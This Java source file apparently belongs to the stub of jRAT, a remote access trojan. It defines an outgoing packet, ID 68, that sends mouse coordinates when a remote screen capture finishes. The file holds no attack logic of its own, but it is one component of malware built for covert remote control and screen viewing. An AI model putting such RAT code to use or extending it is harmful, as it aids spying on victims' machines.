package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {

	private int mouseX;
	private int mouseY;
	
	public Packet68RemoteScreenComplete(int mouseX, int mouseY) {
		this.mouseX = mouseX;
		this.mouseY = mouseY;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(mouseX);
		dos.writeInt(mouseY);
	}

	@Override
	public short getPacketId() {
		return (byte) 68;
	}
}
